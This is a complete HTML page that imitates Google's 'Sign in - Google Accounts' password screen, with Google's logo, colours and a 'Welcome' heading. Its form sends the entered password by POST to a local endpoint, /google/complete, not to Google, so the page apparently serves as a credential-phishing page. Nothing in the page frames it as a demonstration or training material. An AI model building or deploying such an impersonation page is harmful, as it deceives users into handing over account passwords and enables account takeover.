<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Sign in - Google Accounts</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="min-h-screen w-full bg-[#131314] flex flex-col overflow-hidden relative">

  <!-- Top-left logo + heading -->
  <div class="px-10 pt-10">
    <svg width="48" height="48" viewBox="0 0 48 48" class="mb-4">
      <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
      <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.9-2.26 5.36-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
      <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
      <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
    </svg>
    <h1 class="text-white text-3xl font-normal mb-6">Welcome</h1>

    <button class="flex items-center gap-2 bg-transparent border border-gray-500 rounded-full pl-2 pr-3 py-1.5 text-white text-sm">
      <span class="bg-gray-600 rounded-full w-6 h-6 flex items-center justify-center">
        <svg width="14" height="14" viewBox="0 0 24 24" fill="#fff"><circle cx="12" cy="8" r="4"/><path d="M4 20c0-4 4-6 8-6s8 2 8 6"/></svg>
      </span>
      you@gmail.com
      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg>
    </button>
  </div>

  <div class="flex-1 flex items-center justify-center px-6 -mt-20">
    <div class="w-full max-w-3xl flex justify-end">

      <!-- Right -->
      <div class="w-full max-w-md">
        <form id="pwForm" class="flex flex-col" method="POST" action="/google/complete">
          <div class="relative">
            <label class="absolute -top-2 left-3 bg-[#131314] px-1 text-xs text-[#8ab4f8]">Enter your password</label>
            <input
              type="password"
              name="password"
              id="password"
              class="w-full bg-transparent border-2 border-[#8ab4f8] rounded-md px-3 py-3.5 text-base text-white focus:outline-none"
            />
          </div>

          <label class="flex items-center gap-2 mt-4 text-gray-200 text-sm cursor-pointer">
            <input type="checkbox" onclick="document.getElementById('password').type=this.checked?'text':'password'" class="w-4 h-4 accent-white" />
            Show password
          </label>

          <div class="flex items-center justify-between mt-14">
            <a href="/forgot-password" class="text-[#8ab4f8] text-sm font-medium">Forgot password?</a>
            <button
              type="submit"
              class="bg-[#a8c7fa] hover:bg-[#c2dafe] text-[#062e6f] text-sm font-medium rounded-full px-6 py-2.5 transition"
            >
              Next
            </button>
          </div>
        </form>
      </div>
    </div>
  </div>


  <!-- decorative right panel -->
  <div class="hidden lg:block absolute top-0 right-0 h-full w-56 bg-gradient-to-b from-[#4285F4] via-[#1a73e8] to-[#0d47a1] opacity-90"></div>

</body>
</html>
